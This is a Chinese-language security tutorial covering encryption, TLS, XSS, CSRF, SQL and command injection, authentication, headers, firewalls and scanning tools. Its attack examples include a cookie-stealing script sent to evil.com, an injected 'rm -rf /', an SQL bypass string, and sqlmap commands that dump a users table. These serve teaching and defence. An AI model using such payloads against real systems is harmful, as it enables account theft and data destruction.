# 网络安全基础

## 💡 核心结论

1. **对称加密快但密钥交换困难，非对称加密慢但安全**
2. **HTTPS通过TLS提供加密、完整性和身份验证**
3. **防止XSS需转义输出，防止CSRF需验证来源**
4. **SQL注入通过参数化查询预防，命令注入需严格过滤**
5. **防火墙、入侵检测和定期更新是安全防护的基础**

---

## 1. 加密技术

### 1.1 对称加密

**原理**：加密和解密使用同一个密钥

**常用算法**：
- **AES**：高级加密标准（推荐）
- **DES**：数据加密标准（已过时）
- **3DES**：三重DES
- **ChaCha20**：流加密

**AES示例（Python）**：
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# 加密
key = get_random_bytes(32)  # 256位密钥
cipher = AES.new(key, AES.MODE_CBC)
plaintext = b"Secret message"
ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
iv = cipher.iv

print(f"密文: {ciphertext.hex()}")

# 解密
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
print(f"明文: {decrypted.decode()}")
```

**特点**：
- ✅ 速度快
- ✅ 适合大量数据加密
- ❌ 密钥交换困难
- ❌ 密钥泄露则全部泄露

### 1.2 非对称加密

**原理**：公钥加密，私钥解密

**常用算法**：
- **RSA**：最常用
- **ECC**：椭圆曲线加密（更短的密钥）
- **DSA**：数字签名

**RSA示例（Python）**：
```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# 生成密钥对
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# 加密
recipient_key = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(recipient_key)
ciphertext = cipher.encrypt(b"Secret message")

# 解密
private_key = RSA.import_key(private_key)
cipher = PKCS1_OAEP.new(private_key)
plaintext = cipher.decrypt(ciphertext)
```

**特点**：
- ✅ 密钥交换安全
- ✅ 支持数字签名
- ❌ 速度慢
- ❌ 不适合大量数据

### 1.3 哈希函数

**原理**：将任意长度数据映射为固定长度

**常用算法**：
- **SHA-256**：安全哈希算法（推荐）
- **SHA-3**：最新标准
- **MD5**：已不安全，仅用于校验
- **bcrypt**：密码哈希（带盐值）

**密码哈希示例**：
```python
import bcrypt

# 注册时：哈希密码
password = b"user_password"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password, salt)
print(f"Hashed: {hashed.decode()}")

# 登录时：验证密码
if bcrypt.checkpw(password, hashed):
    print("Password correct!")
```

**特点**：
- ✅ 单向函数（不可逆）
- ✅ 固定长度输出
- ✅ 微小改变导致完全不同的哈希值
- 用途：密码存储、文件校验、数字签名

---

## 2. HTTPS/TLS

### 2.1 TLS握手过程

```
1. Client Hello
   - 支持的TLS版本
   - 支持的加密套件
   - 随机数

2. Server Hello
   - 选择的TLS版本
   - 选择的加密套件
   - 随机数
   - 服务器证书

3. 客户端验证证书
   - 检查有效期
   - 检查签名
   - 检查域名

4. 密钥交换
   - 客户端生成Pre-Master Secret
   - 用服务器公钥加密
   - 发送给服务器

5. 生成会话密钥
   Master Secret = PRF(Pre-Master, Client Random, Server Random)

6. 开始加密通信
   使用Master Secret派生的对称密钥
```

### 2.2 证书链

```
Root CA (根证书)
  签名 ↓
Intermediate CA (中间证书)
  签名 ↓
Server Certificate (服务器证书)
```

**验证证书**：
```bash
# 查看证书
$ openssl s_client -connect www.google.com:443 -showcerts

# 验证证书链
$ openssl verify -CAfile ca-bundle.crt server.crt

# 查看证书详情
$ openssl x509 -in server.crt -text -noout
```

### 2.3 生成自签名证书

```bash
# 生成私钥
$ openssl genrsa -out server.key 2048

# 生成证书签名请求（CSR）
$ openssl req -new -key server.key -out server.csr

# 生成自签名证书
$ openssl x509 -req -days 365 -in server.csr \
  -signkey server.key -out server.crt
```

---

## 3. Web安全

### 3.1 XSS（跨站脚本攻击）

**类型**：
1. **存储型XSS**：恶意脚本存储在服务器
2. **反射型XSS**：恶意脚本在URL中
3. **DOM型XSS**：在客户端执行

**攻击示例**：
```html
<!-- 评论输入 -->
<script>
  document.location='http://evil.com/steal?cookie='+document.cookie
</script>

<!-- URL参数 -->
http://example.com/search?q=<script>alert(document.cookie)</script>
```

**防御**：
```python
# 1. 输出转义
from html import escape
user_input = "<script>alert('XSS')</script>"
safe_output = escape(user_input)
# &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

# 2. 使用模板引擎自动转义
# Jinja2, React等默认转义

# 3. Content Security Policy (CSP)
response.headers['Content-Security-Policy'] = "default-src 'self'"

# 4. HttpOnly Cookie
response.set_cookie('session', value, httponly=True)
```

### 3.2 CSRF（跨站请求伪造）

**攻击示例**：
```html
<!-- 受害者访问恶意网站 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<!-- 受害者的Cookie自动发送，请求被执行！ -->
```

**防御**：
```python
# 1. CSRF Token
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# 表单中包含token
<form method="POST">
    {{ csrf_token() }}
    <input name="amount" value="100">
</form>

# 2. SameSite Cookie
response.set_cookie('session', value, samesite='Lax')

# 3. 验证Referer
if request.headers.get('Referer', '').startswith('https://example.com'):
    # 允许请求
    pass

# 4. 自定义请求头（AJAX）
# 跨域请求无法自定义请求头
headers = {'X-Requested-With': 'XMLHttpRequest'}
```

### 3.3 SQL注入

**攻击示例**：
```python
# 危险代码
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# 攻击者输入：
# username: admin' OR '1'='1
# password: anything
# 结果SQL：SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
# 绕过验证！
```

**防御**：
```python
# 1. 参数化查询（最重要）
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)

# 2. ORM
user = User.query.filter_by(username=username, password=password).first()

# 3. 输入验证
import re
if not re.match(r'^[a-zA-Z0-9_]+$', username):
    return "Invalid username"

# 4. 最小权限原则
# 数据库用户只有必要的权限
```

### 3.4 命令注入

**攻击示例**：
```python
# 危险代码
filename = request.args.get('file')
os.system(f'cat {filename}')

# 攻击者输入：
# file=important.txt; rm -rf /
# 执行：cat important.txt; rm -rf /
```

**防御**：
```python
# 1. 避免使用shell
import subprocess
subprocess.run(['cat', filename], shell=False)

# 2. 白名单验证
allowed_files = ['file1.txt', 'file2.txt']
if filename not in allowed_files:
    return "Invalid file"

# 3. 使用库函数而不是命令
with open(filename, 'r') as f:
    content = f.read()
```

---

## 4. 身份认证

### 4.1 Session认证

```python
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = 'secret-key-here'

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if verify_user(username, password):
        session['user_id'] = get_user_id(username)
        return {'message': 'Login successful'}
    
    return {'error': 'Invalid credentials'}, 401

@app.route('/profile')
def profile():
    if 'user_id' not in session:
        return {'error': 'Unauthorized'}, 401
    
    return {'user_id': session['user_id']}
```

### 4.2 JWT认证

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = 'your-secret-key'

# 生成Token
def generate_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(hours=24),
        'iat': datetime.utcnow()
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    return token

# 验证Token
def verify_token(token):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload['user_id']
    except jwt.ExpiredSignatureError:
        return None  # Token过期
    except jwt.InvalidTokenError:
        return None  # Token无效

# 使用
@app.route('/login', methods=['POST'])
def login():
    # 验证用户...
    token = generate_token(user_id)
    return {'token': token}

@app.route('/profile')
def profile():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = verify_token(token)
    
    if not user_id:
        return {'error': 'Unauthorized'}, 401
    
    return {'user_id': user_id}
```

### 4.3 OAuth 2.0

**流程**：
```
1. 客户端 → 授权服务器：请求授权
2. 用户登录并授权
3. 授权服务器 → 客户端：返回授权码
4. 客户端 → 授权服务器：用授权码换取访问令牌
5. 客户端 → 资源服务器：用访问令牌访问资源
```

---

## 5. 常见安全头部

```python
# 1. Content-Security-Policy (CSP)
response.headers['Content-Security-Policy'] = \
    "default-src 'self'; script-src 'self' 'unsafe-inline'"

# 2. X-Frame-Options (防止点击劫持)
response.headers['X-Frame-Options'] = 'DENY'

# 3. X-Content-Type-Options
response.headers['X-Content-Type-Options'] = 'nosniff'

# 4. Strict-Transport-Security (HSTS)
response.headers['Strict-Transport-Security'] = \
    'max-age=31536000; includeSubDomains'

# 5. X-XSS-Protection
response.headers['X-XSS-Protection'] = '1; mode=block'

# 6. Referrer-Policy
response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

# 7. Permissions-Policy
response.headers['Permissions-Policy'] = \
    'geolocation=(), microphone=(), camera=()'
```

---

## 6. 防火墙和端口管理

### 6.1 iptables

```bash
# 查看规则
$ sudo iptables -L -n -v

# 允许SSH
$ sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# 允许HTTP/HTTPS
$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
$ sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 允许已建立的连接
$ sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 默认拒绝其他入站
$ sudo iptables -P INPUT DROP

# 允许所有出站
$ sudo iptables -P OUTPUT ACCEPT

# 保存规则
$ sudo iptables-save > /etc/iptables/rules.v4
```

### 6.2 ufw（Ubuntu）

```bash
# 启用防火墙
$ sudo ufw enable

# 允许SSH
$ sudo ufw allow 22

# 允许HTTP/HTTPS
$ sudo ufw allow 80
$ sudo ufw allow 443

# 允许特定IP的SSH
$ sudo ufw allow from 192.168.1.100 to any port 22

# 拒绝端口
$ sudo ufw deny 23

# 查看状态
$ sudo ufw status

# 删除规则
$ sudo ufw delete allow 80
```

---

## 7. 安全扫描工具

### 7.1 Nikto（Web扫描）

```bash
# 扫描网站
$ nikto -h https://example.com

# 扫描特定端口
$ nikto -h https://example.com -p 8080

# 输出到文件
$ nikto -h https://example.com -o scan.html -Format html
```

### 7.2 OWASP ZAP

**功能**：Web应用安全扫描

**使用**：
1. 配置浏览器代理到ZAP
2. 浏览目标网站（被动扫描）
3. 主动扫描
4. 查看发现的漏洞

### 7.3 SQLMap（SQL注入测试）

```bash
# 测试URL
$ sqlmap -u "http://example.com/page?id=1"

# 测试POST请求
$ sqlmap -u "http://example.com/login" --data="username=admin&password=pass"

# 列出数据库
$ sqlmap -u "http://example.com/page?id=1" --dbs

# 列出表
$ sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# 导出数据
$ sqlmap -u "http://example.com/page?id=1" -D db -T users --dump
```

---

## 8. 最佳实践

### 8.1 密码安全

```python
# 1. 使用强哈希算法
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# 2. 密码强度要求
import re
def check_password_strength(password):
    if len(password) < 8:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'[0-9]', password):
        return False
    if not re.search(r'[!@#$%^&*]', password):
        return False
    return True

# 3. 密码重置
# 使用临时令牌，设置过期时间
token = secrets.token_urlsafe(32)
expires = datetime.now() + timedelta(hours=1)
```

### 8.2 输入验证

```python
# 1. 白名单验证
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg'}
if file.filename.split('.')[-1] not in ALLOWED_EXTENSIONS:
    return "Invalid file type"

# 2. 长度限制
if len(username) > 50:
    return "Username too long"

# 3. 类型检查
if not isinstance(age, int) or age < 0 or age > 150:
    return "Invalid age"

# 4. 正则表达式
import re
if not re.match(r'^[\w\.-]+@[\w\.-]+\.\w+$', email):
    return "Invalid email"
```

### 8.3 日志和监控

```python
import logging

# 配置日志
logging.basicConfig(
    filename='security.log',
    level=logging.WARNING,
    format='%(asctime)s %(levelname)s: %(message)s'
)

# 记录可疑活动
@app.before_request
def log_request():
    logging.info(f"{request.remote_addr} - {request.method} {request.path}")
    
    # 检测可疑请求
    if 'union' in request.args.get('q', '').lower():
        logging.warning(f"Potential SQL injection from {request.remote_addr}")
    
    if '<script>' in request.get_data().decode():
        logging.warning(f"Potential XSS from {request.remote_addr}")
```

---

## 9. 常见问题

### Q1: HTTPS就一定安全吗？
**A**: 
- HTTPS加密传输，但不保证服务器安全
- 证书可能被伪造（中间人攻击）
- 应用层漏洞仍然存在

### Q2: JWT vs Session？
**A**:
- **JWT**: 无状态、跨域、可扩展
- **Session**: 服务器控制、可撤销、更安全

### Q3: 如何防止DDoS？
**A**:
1. 限流（Rate Limiting）
2. CDN和负载均衡
3. 防火墙规则
4. 云服务商的DDoS防护

### Q4: 安全更新频率？
**A**:
- 操作系统：每月
- 应用程序：有更新立即安装
- 库和依赖：定期检查（npm audit, pip-audit）

---

## 参考资源

- OWASP Top 10
- CWE/SANS Top 25
- 《Web应用安全权威指南》
- Mozilla Security Guidelines
- Let's Encrypt（免费HTTPS证书）

